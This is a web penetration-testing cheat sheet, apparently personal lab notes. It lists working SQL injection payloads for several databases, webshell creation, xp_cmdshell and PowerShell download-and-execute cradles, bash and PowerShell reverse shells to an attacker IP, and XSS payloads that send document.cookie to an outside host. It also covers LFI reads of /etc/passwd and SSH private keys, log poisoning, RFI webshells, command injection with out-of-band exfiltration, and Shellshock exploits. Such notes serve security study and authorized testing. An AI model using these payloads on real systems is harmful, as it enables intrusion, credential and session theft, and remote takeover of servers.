# Pentest Web
## SQL Injection - MySQL/MariaDB
-> Bypass Authentication
```
' or 1=1 -- -
admin' -- -
' or 1=1 order by 2 -- -
' or 1=1 order by 1 desc -- - 
' or 1=1 limit 1,1 -- -
```

-> get number columns
```
-1 order by 3;#
```

-> get version
```
-1 union select 1,2,version();#
```

-> get database name
```
-1 union select 1,2,database();#
```

-> get table name
```
-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<database_name>";#
```

-> get column name
``` 
-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<database_name>" and table_name="<table_name>";#
```

-> dump
```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
-1 union select 1,2, group_concat(<column_names>) from <database_name>.<table_name>;#
```


### Webshell via SQLI
-> view web server path  
```
LOAD_FILE('/etc/httpd/conf/httpd.conf')    
```

-> creating webshell
```
select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
```
MYSQL to RCE
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- //
http://192.168.xx.xx/tmp/webshell.php?cmd=id

reverse shell
GET /tmp/webshell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.xx.xx/4444+0>%261'
```
 
### Reading Files via SQLI - MySQL
e.g.  
```
SELECT LOAD_FILE('/etc/passwd')
```

## Oracle SQL
-> Bypass Authentication
```
' or 1=1--
```

-> get number columns
```
' order by 3--
```

-> get table name
```
' union select null,table_name,null from all_tables--
```

-> get column name
```
' union select null,column_name,null from all_tab_columns where table_name='<table_name>'--
```

-> dump
```
' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
```

## SQLite Injection
-> extracting table names, not displaying standard sqlite tables
```
http://site.com/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
```
-> extracting table users  
```
http://site.com/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users--
```

-> Reference  
https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf

## MSSQL Injection
-> Bypass Authentication
```
' or 1=1--
```
-> get version+delay
```
' SELECT @@version; WAITFOR DELAY '00:00:10'; —
```

-> Enable xp_cmdshell
```
' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

-> RCE
```
' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<ip>/InvokePowerShellTcp.ps1')" ;--
```
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

## Abuse MSSQL
-> edit Invoke-PowerShellTcp.ps1, adding this:  
```
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
```
```
impacket-mssqlclient <user>@<ip> -db <database>
```
```
xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://<ip>/Invoke-PowerShellTcp.ps1\")
```
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

## Cross-Site Scripting
1-> Identify the language and frameworks used  
2-> Identify entry points (parameters, inputs, responses reflecting values you can control, etc)   
3-> Check how this is reflected in the response via source code preview or browser developer tools  
4-> Check the allowed special characters  
```
< > ' " { } ;
```
5-> Detect if there are filters or blockages and modify as needed to make it work

### XSS to LFI
```
<img src=x onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
```
	
### XSS - Session Hijacking
-> Examples
```
<script>new Image().src="http://<IP>/ok.jpg?output="+document.cookie;</script>
<script type="text/javascript">document.location="http://<IP>/?cookie="+document.cookie;</script>  
<script>window.location="http://<IP>/?cookie="+document.cookie;</script>
<script>document.location="http://<IP>/?cookie="+document.cookie;</script>  
<script>fetch('http://<IP>/?cookie=' + btoa(document.cookie));</script>  
```

## Git Exposed
```
python3 -m venv git-dumper-venv && source git-dumper-venv/bin/activate && pip install git-dumper 
git-dumper http://192.168.115.144/.git/ .
cd .git
git log
show 44a055daf7a0cd777f28f444c0d29dddjw9c9wj11
```

## Local File Inclusion - LFI
LFI And Directory Traversal
```
http://example.com/example/?view=../../../../../../../../../etc/passwd
http://example.com/example/?view=../../../../../../../../../home/<user>/.ssh/authorized_keys
http://example.com/example/?view=../../../../../../../../../home/<user>/.ssh/id_ecdsa
http://example.com/example/?view=../../../../../../../../../home/<user>/.ssh/id_rsa
```
```
http://example.com/example/?view=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
http://example.com/example/?view=%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/<user>/.ssh/authorized_keys
http://example.com/example/?view=%2e%2e/%2e%2e/%2e%2e/%2e%2e./home/<user>/.ssh/id_ecdsa
http://example.com/example/?view=%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/<user>/.ssh/id_rsa
```

### PHP Wrappers
Display Content
```
curl http://example.com/example/index.php?page=admin.php
curl http://example.com/example/index.php?page=php://filter/resource=admin.php
curl http://example.com/example/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```
Code Execution
```
data:// wrapper is used to achieve code execution
data:// wrapper will not work in a default PHP installation. To exploit it, the allow_url_include setting needs to be enabled
curl "http://example.com/example/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"                             
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
output -> PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
curl "http://example.com/example/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```
  
#### LFI + File Upload
```
Using Executable Files
PHP Code Execution
One method to bypass this filter is to change the file extension to a less-commonly used PHP file extension such as .phps or .php7. This may allow us to bypass simple filters that only check for the most common file extensions, .php and .phtml.

try Uppercase maybe they are not filtered .pHP
combine file upload with RFI
nc -nvlp 4444
setup python server 80
/usr/share/webshells/php/simple-backdoor.php
curl http://192.168.xx.<victim>/example/uploads/simple-backdoor.pHP?cmd=dir

PS>pwsh
PS>$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.xx.<kali>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
PS>exit

powershell -enc JABjAG........
curl http://192.168.xx.<victim>/example/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20ABjAGwAaQBlAG4AdAAgAD0AIABOAGUAd

or
curl http://192.168.xx.<victim>/styles/cmd.php --data-urlencode 'cmd=powershell -c iex (iwr -UseBasicParsing http://192.168.xx.<kali>/Invoke-PowerShellTcp.ps1)'

linux
curl http://192.168.xx.<victim>/tiny/uploads/cmd.php -d 'cmd=bash -c "bash -i >%26 /dev/tcp/192.168.xx.<kali>/4444 0>%261"'

/config.php?cmd=id

### Using Non-Executable Files

When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.

Apache,nginx use user www-data
Microsoft IIS 7.5 and up use Network Service account, a passwordless built-in Windows identity with low privileges

Let's try to overwrite the authorized_keys file in the home directory for root. If this file contains the public key of a private key we control, we can access the system via SSH as the root user. 

kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...
chmod 600 fileup
kali@kali:~$ cat fileup.pub > authorized_keys

#to try it out curl http://192.168.xx.<victim>:7777/root/.ssh/authorized_keys --upload-file broker.pub

rm ~/.ssh/known_hosts
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@192.168.xx.<victim>

we replace/overwrite permission authorized_keys with our pub
file upload
filename="../../../../../../../../../../../../../../../../root/.ssh/authorized_keys"

┌──(kali㉿kali)-[~/Desktop]
└─$ ssh root@192.168.xx.<victim> -i ~/.ssh/fileup -p 2222 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"

```

-> gif  
```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif
``` 
https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/shell.gif  
-> Zip  
1-  
```
echo '<?php system($_GET["cmd"]); ?>' > ok.php && zip wshell_zip.jpg ok.php
```
2-  
```
http://ip/index.php?file=zip://./uploads/wshell_zip.jpg%23ok.php&cmd=id  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/wshell_zip.jpg 
```

#### Log Poisoning
-> apache
```
nc ip 80  
<?php system($_GET[‘cmd’]); ?>  
```  
or  
1-  
```
curl -s http://ip/index.php -A '<?php system($_GET[‘cmd’]); ?>'
```
2-  
http://ip/index.php?file=/var/log/apache2/access.log&cmd=id  
  
-> SMTP  
```
telnet ip 23
MAIL FROM: email@gmail.com
RCPT TO: <?php system($_GET[‘cmd’]); ?>  
http://ip/index.php?file=/var/mail/mail.log&cmd=id
```  
  
-> SSH  
```
ssh \'<?php system($_GET['cmd']);?>'@ip  
http://ip/index.php?file=/var/log/auth.log&cmd=id
```  

-> PHP session  
```
http://ip/index.php?file=<?php system($_GET["cmd"]);?>  
http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id
```
  
-> Other Paths  
```
/var/log/nginx/access.log  
/var/log/sshd.log  
/var/log/vsftpd.log  
/proc/self/fd/0-50  
```

### Template LFI and directory traversal - Nuclei
https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/fuzzing/linux-lfi-fuzzing.yaml
https://raw.githubusercontent.com/CharanRayudu/Custom-Nuclei-Templates/main/dir-traversal.yaml

## Remote File Inclusion (RFI)
### RFI to Webshell with null byte for image extension bypass
```
echo "<?php echo shell_exec($_GET['cmd']); ?>" > evil.txt
python -m http.server 80
```
```
http://site.com/menu.php?file=http://<IP>/evil.php%00.png
```

### RFI to Webshell with txt
```
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > evil.txt
python -m http.server 80
```
```
http://site.com/menu.php?file=http://<IP>/evil.txt&cmd=ipconfig
```
```
9.2.3. Remote File Inclusion (RFI)
the allow_url_include option needs to be enabled to leverage RFI
setup python server 80
/usr/share/webshells/php/simple-backdoor.php
python3 -m http.server 80
curl "http://example.com/example/index.php?page=http://192.168.xx.<kali>/simple-backdoor.php&cmd=ls"
curl "http://example.com/example/index.php?page=http://192.168.xx.<kali>/simple-backdoor.php&cmd=cat%20/etc/passwd"
curl "http://example.com/example/index.php?page=http://192.168.xx.<kali>/simple-backdoor.php&cmd=ls%20-la%20/home/<user>/"
curl "http://example.com/example/index.php?page=http://192.168.xx.<kali>/simple-backdoor.php&cmd=ls%20-la%20/home/<User>/.ssh"
curl "http://example.com/example/index.php?page=http://192.168.xx.<kali>/simple-backdoor.php&cmd=ls%20-la%20/home/<User>/.ssh/authorized_keys"
curl "http://example.com/example/index.php?page=http://192.168.xx.<kali>/simple-backdoor.php&cmd=ls%20-la%20/home/<User>/.ssh/id_rsa"
curl "http://example.com/example/index.php?page=http://192.168.xx.<kali>/simple-backdoor.php&cmd=ls%20-la%20/home/<User>/.ssh/id_ecdsa"


revshell using PHP Ivan Sincek -> https://www.revshells.com/
nc -lvnp 4444
curl "http://example.com/example/index.php?page=http://192.168.xx.<kali>5/shell.php"
```
## OS Command Injection
-> Special Characters
```
& command
&& command
; command
command %0A command
| command
|| command
`command`
$(command)

example: Archive=test%20--version%3Bbash+-c+'bash+-i+>%26+/dev/tcp/192.168.x.xxx/4444+0>%261'
```

-> Out Of Band - OOB Exploitation
```
curl http://$(whoami).site.com/
curl http://`whoami`.site.com/
nslookup `whoami`.attacker-server.com &
curl http://192.168.0.20/$(whoami)
```

-> Check if the commands are executed by PowerShell or CMD
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

## Shellshock
-> Detection
```
nikto -h <IP> -C all
```
	
-> Exploit
```
curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -c 'whoami'" <IP>
curl -A "() { :; };echo ;/bin/bash -c 'hostname'"  <IP>
curl -A "() { :; }; /usr/bin/nslookup $(whoami).site.com" <IP>
```

## WebDAV
-> Connect to WebDAV server and send malicious file to shell
```
cadaver http://<IP>/webdav
put <shell.asp>
```
```
curl -u "<user>:<password>" http://<IP>/webdav/shell.asp
```
https://github.com/notroj/cadaver
